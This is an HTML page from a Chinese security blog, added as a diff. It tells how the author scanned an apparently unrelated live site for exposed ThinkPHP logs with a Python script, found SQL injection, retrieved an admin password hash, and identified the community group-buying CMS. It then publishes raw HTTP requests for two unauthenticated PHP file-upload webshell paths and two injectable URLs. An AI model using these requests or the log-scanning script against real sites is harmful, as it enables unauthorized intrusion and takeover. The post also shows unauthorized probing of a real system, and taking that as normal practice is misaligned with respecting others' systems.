@@ -1,0 +1,235 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  <meta charset="UTF-8">
+  <title>从泄露日志到sql注入再到前台getshell - typotypo&#39;s blog</title>
+
+  <link rel="icon" href="">
+<link href="https://cdn.jsdelivr.net/npm/remixicon@2.5.0/fonts/remixicon.css" rel="stylesheet">
+
+  
+  <!-- Global site tag (gtag.js) - Google Analytics -->
+  <!-- <script async src="https://www.googletagmanager.com/gtag/js?id=G-NFCRR8Q57W"></script>
+  <script>
+    window.dataLayer = window.dataLayer || [];
+    function gtag(){dataLayer.push(arguments);}
+    gtag('js', new Date());
+  </script> -->
+  <script async src='https://www.google-analytics.com/analytics.js'></script>
+
+
+
+  <script>
+    window.ga=window.ga||function(){(ga.q=ga.q||[]).push(arguments)};ga.l=+new Date;
+    ga('create', 'UA-182385326-1');
+    ga('set', 'dimension1', 'site/E2DmFJYwg');
+    ga('set', 'dimension2', 'post/');
+    ga('send', 'pageview');
+    // gtag('set', {
+    //   'custom_map': {
+    //     'dimension1': 'siteId',
+    //     'dimension2': 'postId',
+    //   }
+    // })
+
+    // gtag('config', 'G-NFCRR8Q57W', {
+    //   'siteId': 'site/E2DmFJYwg',
+    //   'postId': 'post/',
+    // });
+  </script>
+
+
+
+
+
+  <meta name="viewport" content="width=device-width, initial-scale=1.0">
+  <meta name="description" content="今天下午无聊，fofa翻一个ip的C段，看到了一个cms。如下
+
+随手一加，报错，可以发现是ThinkPHP3.x的系统
+
+于是想到自己写个脚本，跑一遍泄露日志
+import requests
+requests.packages.urlli...">
+
+  <meta property="og:title" content="从泄露日志到sql注入再到前台getshell - typotypo&#39;s blog">
+  <meta property="og:description" content="今天下午无聊，fofa翻一个ip的C段，看到了一个cms。如下
+
+随手一加，报错，可以发现是ThinkPHP3.x的系统
+
+于是想到自己写个脚本，跑一遍泄露日志
+import requests
+requests.packages.urlli...">
+  <!-- <meta property="og:image" content="/some-image.png"> -->
+  <meta property="og:url" content="cong-xie-lu-ri-zhi-dao-sql-zhu-ru-zai-dao-qian-tai-getshell/">
+  <meta property="og:site_name" content="typotypo&#39;s blog">
+
+  <meta name="twitter:card" content="summary_large_image">
+  <meta name="twitter:image:alt" content="从泄露日志到sql注入再到前台getshell">
+
+  <meta name="gridea:post_id" content="">
+
+  <link rel="stylesheet" href="//cdn.jsdelivr.net/npm/@gridea/theme@1.0.4/css/main.css">
+  <link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/highlight.js@10.0.3/styles/a11y-light.css">
+</head>
+<body class="bg-gray-100">
+  <div id="page">
+    <div class="mb-16 sticky top-0 z-20" :class="{
+  'bg-gray-100': !overTop
+}">
+  <header class="py-4 flex items-baseline justify-between max-w-2xl mx-auto px-2">
+    <h1 class="text-xl text-center font-medium px-4 md:px-0">
+      <a href="/">typotypo&#39;s blog</a>
+    </h1>
+    <div class="flex justify-center">
+      
+    </div>
+  </header>
+</div>
+    <div class="border-b border-gray-200">
+      <div class="max-w-2xl mx-auto px-6 md:px-2">
+        <div class="my-24">
+          <h1 class="text-3xl py-4 font-black">从泄露日志到sql注入再到前台getshell</h1>
+          <div class="flex ">
+            
+          </div>
+        </div>
+      </div>
+    </div>
+    <div id="sticky-bar" class="w-full sticky top-0 z-10 bg-white" style="height: 64px;"></div>
+    <div class="p-4 md:p-16 bg-white">
+      <div class="max-w-2xl mx-auto px-2 flex relative">
+        <section class="post-content flex-1 default-post-content max-w-2xl">
+          <div v-pre>
+            <p>今天下午无聊，fofa翻一个ip的C段，看到了一个cms。如下<br>
+<img src="https://static.gridea.dev/5403045qqcom/4Zl3XUlAa.png" alt="" loading="lazy"><br>
+随手一加，报错，可以发现是ThinkPHP3.x的系统<br>
+<img src="https://static.gridea.dev/5403045qqcom/XjAFmTsVd.png" alt="" loading="lazy"><br>
+于是想到自己写个脚本，跑一遍泄露日志</p>
+<pre><code>import requests
+requests.packages.urllib3.disable_warnings()
+base = 'http://xxx.cn/Runtime/Logs/Home/19_'
+for i in ['01','02','03','04','05','06','07','08','09','10','11','12']:
+	for x in ['01','02','03','04','05','06','07','08','09','10','11','12','13','14','15','16','17','18','19','20','22','22','23','24','25','26','27','28','29','30','31']:
+		url =base+i+'_'+x+'.log'
+		r = requests.get(url,verify=False)
+		if r.status_code == 200:
+			#http://xxx.cn/Runtime/Logs/Home/20_12_01.log
+			print(url)
+		else:
+			print(url+&quot;|日志不存在...........&quot;)
+</code></pre>
+<p><img src="https://static.gridea.dev/5403045qqcom/iT-pKAivZ.png" alt="" loading="lazy"><br>
+还真跑出来了<br>
+<img src="https://static.gridea.dev/5403045qqcom/WBQJg-6hd.png" alt="" loading="lazy"><br>
+感觉有点像注入，于是贴上链接去访问<br>
+<img src="https://static.gridea.dev/5403045qqcom/P5kmsR88w.png" alt="" loading="lazy"><br>
+ok，注入一枚到手<br>
+然后跑下管理员密码<br>
+<img src="https://static.gridea.dev/5403045qqcom/YbQz5wtub.png" alt="" loading="lazy"><br>
+密码加密了，<em>MDAwMDAwMDAwMJCMg9mTiWaXhaaXow</em><br>
+谷歌搜索一下，看能不能知道是什么cms<br>
+<img src="https://static.gridea.dev/5403045qqcom/mNDuPZJsp.png" alt="" loading="lazy"><br>
+原来是狮子鱼社区团购系统啊<br>
+<img src="https://static.gridea.dev/5403045qqcom/br0vi1udE.png" alt="" loading="lazy"><br>
+感谢这位老哥，默认密码是admin888<br>
+知道了是什么系统后，我就下载了源码到本地，粗略的看了下，就发现了别的注入和前台getshell</p>
+<h1 id="前台getshell-0x01">前台getshell 0x01</h1>
+<pre><code>POST /wxapp.php?controller=Goods.doPageUpload HTTP/1.1
+Host: 192.168.3.7
+Content-Length: 214
+Cache-Control: max-age=0
+Upgrade-Insecure-Requests: 1
+Origin: null
+Content-Type: multipart/form-data; boundary=----WebKitFormBoundary8UaANmWAgM4BqBSs
+User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/86.0.4240.111 Safari/537.36
+Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9
+Accept-Encoding: gzip, deflate
+Accept-Language: zh-CN,zh;q=0.9
+Connection: close
+
+------WebKitFormBoundary8UaANmWAgM4BqBSs
+Content-Disposition: form-data; name=&quot;upfile&quot;; filename=&quot;typotypo.php&quot;
+Content-Type: image/gif
+
+&lt;?php echo('typotypo');?&gt;
+
+------WebKitFormBoundary8UaANmWAgM4BqBSs--
+</code></pre>
+<p><img src="https://static.gridea.dev/5403045qqcom/cGj8sOiZ5.png" alt="" loading="lazy"><br>
+<img src="https://static.gridea.dev/5403045qqcom/zgANl0HRO.png" alt="" loading="lazy"></p>
+<h1 id="前台getshell-0x02">前台getshell 0x02</h1>
+<pre><code>POST /Common/ckeditor/plugins/multiimg/dialogs/image_upload.php HTTP/1.1
+Host: 192.168.3.7
+Content-Length: 213
+Cache-Control: max-age=0
+Upgrade-Insecure-Requests: 1
+Origin: null
+Content-Type: multipart/form-data; boundary=----WebKitFormBoundary8UaANmWAgM4BqBSs
+User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/86.0.4240.111 Safari/537.36
+Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9
+Accept-Encoding: gzip, deflate
+Accept-Language: zh-CN,zh;q=0.9
+Connection: close
+
+------WebKitFormBoundary8UaANmWAgM4BqBSs
+Content-Disposition: form-data; name=&quot;files&quot;; filename=&quot;typotypo.php&quot;
+Content-Type: image/gif
+
+&lt;?php echo('typotypo');?&gt;
+
+------WebKitFormBoundary8UaANmWAgM4BqBSs--
+</code></pre>
+<p><img src="https://static.gridea.dev/5403045qqcom/R31da0kfv.png" alt="" loading="lazy"><br>
+<img src="https://static.gridea.dev/5403045qqcom/oNnzW5HE2.png" alt="" loading="lazy"></p>
+<h1 id="sql注入-0x01">sql注入 0x01</h1>
+<blockquote>
+<p>http://localhost/index.php?s=api/goods_detail&amp;goods_id=1* id为注入参数</p>
+</blockquote>
+<p><img src="https://static.gridea.dev/5403045qqcom/CCz_JYGrg.png" alt="" loading="lazy"></p>
+<h1 id="sql注入-0x02">sql注入 0x02</h1>
+<blockquote>
+<p>http://localhost/index.php?s=apigoods/get_goods_detail&amp;id=1* id为注入参数</p>
+</blockquote>
+<p><img src="https://static.gridea.dev/5403045qqcom/Z0GugRI34.png" alt="" loading="lazy"><br>
+应该还有很多洞，这些都是前台不需要登录的，后台的洞懒得看了，睡觉 🙄</p>
+
+          </div>
+          <div class="py-4 text-gray-600 flex items-center justify-between">
+            <div class="">
+              <div class="text-sm text-gray-300">最后更新于: </div>
+              <div class="text-base font-medium">2021-01-03</div>
+            </div>
+            <!-- <div class="flex items-center text-sm text-gray-600">
+              <i class="ri-eye-line"></i> <span class="ml-2">{{ views }}</span>
+            </div> -->
+          </div>
+          <div>
+            <div id="disqus_thread"></div>
+          </div>
+        </section>
+        
+          <aside class="sticky toc-container flex-shrink-0 hidden md:block">
+            <div class="text-gray-600 mb-4">目 录</div>
+            <ul class="markdownIt-TOC">
+<li><a href="#%E5%89%8D%E5%8F%B0getshell-0x01">前台getshell 0x01</a></li>
+<li><a href="#%E5%89%8D%E5%8F%B0getshell-0x02">前台getshell 0x02</a></li>
+<li><a href="#sql%E6%B3%A8%E5%85%A5-0x01">sql注入 0x01</a></li>
+<li><a href="#sql%E6%B3%A8%E5%85%A5-0x02">sql注入 0x02</a></li>
+</ul>
+
+          </aside>
+        
+      </div>
+    </div>
+    <div class="py-8 text-gray-300 text-center border-t border-gray-200">
+  Powered by Gridea
+</div>
+  </div>
+
+  <script src="//cdn.jsdelivr.net/npm/vue@2.6.11"></script>
+  <script src="//cdn.jsdelivr.net/npm/@gridea/theme@1.0.4/js/main.js"></script>
+  <script src="//cdn.jsdelivr.net/gh/highlightjs/cdn-release@10.0.0/build/highlight.min.js"></script>
+  <script>hljs.initHighlightingOnLoad();</script>
+  
+</body>
+</html>
